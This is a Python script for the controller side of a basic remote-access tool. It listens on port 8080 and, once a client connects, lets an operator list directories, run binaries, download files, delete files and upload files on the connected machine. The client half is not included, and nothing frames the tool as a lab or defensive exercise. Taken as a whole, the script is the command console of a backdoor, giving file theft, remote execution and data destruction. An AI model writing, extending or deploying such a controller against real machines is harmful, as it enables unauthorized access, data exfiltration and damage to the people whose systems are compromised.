import os
import socket

s = socket.socket()
host=socket.gethostname()
port=8080
s.bind((host,port))
print("")
print("server is running at", host)
print("")
print("Wating...")
s.listen(1)
conn, addr = s.accept()
print("")
print(addr, "Has connected...")

#conn complete

while 1:
    command = input(str("Command >> "))
    if command == "pwd":
        conn.send(command.encode())
        print("Command sent....")
        print("")
        #conn.recv(1024)
        print("Sucess")
        files=conn.recv(5000)
        files=files.decode()
        print("Recieved", files)

    elif command == "dir":
        conn.send(command.encode())
        print("Command sent....")
        files=conn.recv(5000)
        files=files.decode()
        print("result: ",files)

    elif command=="dirof":
        conn.send(command.encode())
        print("")
        user_input=input(str("Custom dir: "))
        conn.send(user_input.encode())
        print("Command sent....")
        files = conn.recv(5000)
        files = files.decode()
        print("result: ", files)
    
    elif command == "run":
        conn.send(command.encode())
        user_input=input(str("Binary >> "))
        conn.send(user_input.encode())

    elif command=="download":
        conn.send(command.encode())
        filepath = input(str("enter file path: "))
        conn.send(filepath.encode())
        file = conn.recv(10000)
        filename = input("name for incoming file including extenstion: ")
        new_file = open(filename, "wb")
        new_file.write(file)
        new_file.close()
        print(filename, " has been saved")

    elif command=="del":
        conn.send(command.encode())
        fileanddir = input(str("Enter filename and its directory: "))
        conn.send(fileanddir.encode())
        print("Command executed")


    elif command == "send":
        conn.send(command.encode())
        file = input(str("Please enter filename and it's directory: "))
        filename = input(str("enter the name you want to give the file"))
        data = open(file,"rb")
        filedata = data.read(7000)
        conn.send(filename.encode())
        print(file, " sent")
        conn.send(filedata)
        

        
    else:
        print("")
        print("Command not found")
        



